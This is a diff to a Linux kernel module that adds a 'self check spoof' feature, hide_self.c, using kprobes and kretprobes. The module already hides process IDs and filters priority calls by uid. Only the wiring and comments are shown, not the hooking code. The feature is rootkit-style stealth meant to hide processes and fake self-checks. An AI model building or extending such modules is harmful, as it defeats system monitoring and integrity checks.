@@ -292,6 +292,7 @@ __weak long copy_from_kernel_nofault(void *dst, const void *src, size_t size)
 #include "routine_kp.c"
 #include "routine_raw.c"
 #include "hide_pid.c"
+#include "hide_self.c"
 
 static int __init fgetpriority_init(void)
 {
@@ -303,11 +304,12 @@ static int __init fgetpriority_init(void)
 		return err;
 #endif
 	/*
-	 * Two independent features are armed here:
+	 * Three independent features are armed here:
 	 *   1. the priority/ioprio uid filter (routine_raw.c, kprobes fallback)
 	 *   2. the pid filter (hide_pid.c, kprobes only)
-	 * Either one alone is useful, so a failure in one must not stop the
-	 * other. Only "both failed" makes the module pointless.
+	 *   3. the self check spoof (hide_self.c, kprobe + kretprobes)
+	 * Any one alone is useful, so a failure in one must not stop the
+	 * others. Only "all failed" makes the module pointless.
 	 */
 	int prio_ret = getpriority_hook_init();
 	pr_info("init: priority hook ret: %d\n", prio_ret);
@@ -321,7 +323,10 @@ static int __init fgetpriority_init(void)
 	int pid_ret = hide_pid_init();
 	pr_info("init: hide_pid ret: %d\n", pid_ret);
 
-	if (prio_ret && pid_ret) {
+	int self_ret = hide_self_init();
+	pr_info("init: hide_self ret: %d\n", self_ret);
+
+	if (prio_ret && pid_ret && self_ret) {
 		pr_info("init: nothing armed, aborting\n");
 		return prio_ret;
 	}
@@ -342,6 +347,7 @@ static void __exit fgetpriority_exit(void)
 	if (ret)
 		panic("kobj add failed!\n");
 
+	hide_self_exit();
 	hide_pid_exit();
 
 	int r = getpriority_hook_exit();
